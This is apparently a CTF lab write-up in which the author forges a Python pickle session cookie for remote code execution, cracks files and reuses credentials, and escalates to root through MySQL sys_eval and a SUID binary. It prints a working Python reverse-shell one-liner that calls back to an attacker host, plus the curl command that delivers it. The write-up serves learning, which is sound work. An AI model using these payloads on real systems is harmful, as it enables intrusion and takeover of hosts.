---
title: 'AttackDenfed CTF: Oct 1 2020'
date: '2020-11-22 16:40:00 -0400'
categories:
  - CTF
  - AttackDefend
tags:
  - CTF
  - AttackDefend
  - Reverse Engineering
  - Ghidra
  - Pickle
  - SUID
  - MySQL
published: true
---

# Flag 1

We're given a target address of 192.x.y.3. An Nmap scan shows SSH and a web server running.

![13c5d8ac4fab585020b936499aed00f4.png](./../../assets/img/13c5d8ac4fab585020b936499aed00f4.png)

Looking at the webapp on port 8080, it seems like input sanitization bypass might be the way forward.

![03533c048460bba8252626c4d39bcd0a.png](./../../assets/img/03533c048460bba8252626c4d39bcd0a.png)

We aren't able to modify the command argument with guest access, so we'll take a look at the request in Burp to see if there's anything useful in there.

![732ff63139706d26176bc69eb58f0f6f.png](./../../assets/img/732ff63139706d26176bc69eb58f0f6f.png)

The cookie value looks interesting, so we'll decode the Base64 to see if there is anything we can learn.

![743f6ad833cdb58d79dc2a9aea1bc415.png](./../../assets/img/743f6ad833cdb58d79dc2a9aea1bc415.png)

We're able to change the role from guest to admin and alter the commands on the site, but they are heavily filtered. But if we run a quick google search for something like "dp0 cookie" we see that this is in fact a pickle cookie, and that's something we can exploit.

![f933873666826e430d4cd3926f6d891a.png](./../../assets/img/f933873666826e430d4cd3926f6d891a.png)

The contents of revshell.sh.

![084f43f41227627cdb59ff7e2d957528.png](./../../assets/img/084f43f41227627cdb59ff7e2d957528.png)

Now we'll generate the new cookie using a custome script.

![ae15f852cdedea23a9ea314f40a6ebbd.png](./../../assets/img/ae15f852cdedea23a9ea314f40a6ebbd.png)

Before firing off the exploit, we'll host the revshell and a dummy text file called finished.txt with Python. The purpose of the text file is just in case we don't get a shell, to see if the target is processing past our shell script. It shouldn't since we're opening up a network connection. Now we'll drop the new cookie value into Burp repeater with a NC listener up and fire away.

![016494e0b7dd98ae39eba7136aaa632f.png](./../../assets/img/016494e0b7dd98ae39eba7136aaa632f.png)
![fe47363ef03f628a86287086b8e2de52.png](./../../assets/img/fe47363ef03f628a86287086b8e2de52.png)
![c1b15e4bcd7420371ac4ee5fdfd0c54b.png](./../../assets/img/c1b15e4bcd7420371ac4ee5fdfd0c54b.png)

Now we can grab our flag.

![4b6d04a98033d9078395fd3704631aa4.png](./../../assets/img/4b6d04a98033d9078395fd3704631aa4.png)

There is a cleaner way to reproduce this now that we know how it all works. First thing we have to do is change the DEFAULT_COMMAND line in our exploit code to the following:

```
DEFAULT_COMMAND = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.76.80.2\",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```

Then we generate the new cookie.

![0e4103e4fc8673fb2ce05016fc5439e8.png](./../../assets/img/0e4103e4fc8673fb2ce05016fc5439e8.png)

Next, with a NC lisitener up, we use Curl to send the payload with `curl -s --cookie "session=<exploit cookie> "http://192.76.80.3:8080/`.

![2d800efa36ae5f669eed0ca6997c7f3e.png](./../../assets/img/2d800efa36ae5f669eed0ca6997c7f3e.png)
![6cdbb5d3b5f6e8d76d673521c9858caf.png](./../../assets/img/6cdbb5d3b5f6e8d76d673521c9858caf.png)

# Flag 2

Now that we're on the target, we find a Pcap file in /home/admin. To make things easier, we'll spin up a Python HTTP server on the target and download it to our machine.

![5a6056468d97411f7987cef87aca9e81.png](./../../assets/img/5a6056468d97411f7987cef87aca9e81.png)
![cf9617ff40bcb931e8cfd650a0e757f8.png](./../../assets/img/cf9617ff40bcb931e8cfd650a0e757f8.png)

Looking through the Pcap in wireshark we can see that there are some file downloads in the traffic.

![a42d4c0a962958a234e528acb3f49ad5.png](./../../assets/img/a42d4c0a962958a234e528acb3f49ad5.png)

We'll extract all of the Zip files since they all appear to be important.

![3428b6ec563963556993ec86a588c2d0.png](./../../assets/img/3428b6ec563963556993ec86a588c2d0.png)

All of the Zip files extract without requiring a password. Now to start digging. The secret.jpg appears to be a plain image with nothing in the EXIF data. But if we run strings against it, there's an RSA key embedded into the file.

![237c378f8e9fd4f9fba05cca4a237a02.png](./../../assets/img/237c378f8e9fd4f9fba05cca4a237a02.png)

We don't have any luck using that key to SSH in as admin, so we'll save it and move on for now. Next we'll take a look at the PDF file. If we use pdf2john to make a hash, we can crack it with john and rockyou.

![c14b40e424f62b7e3443c09a10a688b4.png](./../../assets/img/c14b40e424f62b7e3443c09a10a688b4.png)
![22968642485408a485bfc6968120225a.png](./../../assets/img/22968642485408a485bfc6968120225a.png)

Now we can open the PDF with the password.

![f4cf72a18af4761edd357f7ed07d1533.png](./../../assets/img/f4cf72a18af4761edd357f7ed07d1533.png)

Since there is a password hash for an admin user, we'll try to crack that while we work on the binary file.

![40c5a7d8daee1b2c945eab7f4e189ae1.png](./../../assets/img/40c5a7d8daee1b2c945eab7f4e189ae1.png)

To check for a possible BOF, we'll throw a bunch of characters at it as an argument and see if anything happens.

![fd831af077eb02295fd7f05b099f9eb2.png](./../../assets/img/fd831af077eb02295fd7f05b099f9eb2.png)

Well this has potential, so we'll take a look at the binary in Ghidra to see if we can figure out what's going on.

![af0ff297b290b8f5c624818209a0e2e5.png](./../../assets/img/af0ff297b290b8f5c624818209a0e2e5.png)

The binary wants the argument of "imroot", so we'll try it and see what we get.

![17f24df53b960fc22de613763d16f739.png](./../../assets/img/17f24df53b960fc22de613763d16f739.png)

Awesome, we now have another key. Unfortunately this doesn't get us into the box as root or admin. This is where we have to go back and take things exactly as their written. The admin "hash" from the PDF really was the plain text password. So we SSH into the box as `admin:05055025948b9ac1481582801c7bb732`.

![3a785b158455ce5c16aaff6f790bfd69.png](./../../assets/img/3a785b158455ce5c16aaff6f790bfd69.png)

Now to grab the flag and wrap up this part of the challenge.

![fece5207fd106f7c6a144d4c7cb2b575.png](./../../assets/img/fece5207fd106f7c6a144d4c7cb2b575.png)

# Flag 3

Now we're set to look for root. If we take a look at Bash history we can see two password change commands.

![aa61bfd730bf3de341931f844e3a95b5.png](./../../assets/img/aa61bfd730bf3de341931f844e3a95b5.png)

With some tinkering, we're able to login to the local MySQL server as `admin:I_w4nt3d_4n_34sy_p4ssword_t0_r3m3mb3r`.

![68585a7abd2ed1937761a5a36b6ea3c1.png](./../../assets/img/68585a7abd2ed1937761a5a36b6ea3c1.png)

If we take a look at the internal functions we have at our displosal, we can see we have access to the sys_eval function. This should gain us RCE as root, so we'll run a simple check to see if it's what we want.

![a834bd119bde93af106c1f806349b0d4.png](./../../assets/img/a834bd119bde93af106c1f806349b0d4.png)
![17ccbb8aba9143944cae1686c8927c0f.png](./../../assets/img/17ccbb8aba9143944cae1686c8927c0f.png)

Perfect, we can run commands as root. We could just enumerate and grab the flag like this, but a shell is always the best way to go for the sake of learning. First we need to create a simple privesc binary called shell.c.

![a14f633f2df7d4a548b212bb85e86fa7.png](./../../assets/img/a14f633f2df7d4a548b212bb85e86fa7.png)

Next we'll compile it.

![9aed51c40de2052109ce8d092e26c531.png](./../../assets/img/9aed51c40de2052109ce8d092e26c531.png)

Now using MySQL, we'll turn the binary into a SUID.

![f7dd4c44bf49b4cc4a33fa16031beb42.png](./../../assets/img/f7dd4c44bf49b4cc4a33fa16031beb42.png)

Now we can run the SUID binary and get out full root shell and the last flag.

![7ddc39c71fc421d0a326ba0ad6bd04ca.png](./../../assets/img/7ddc39c71fc421d0a326ba0ad6bd04ca.png)
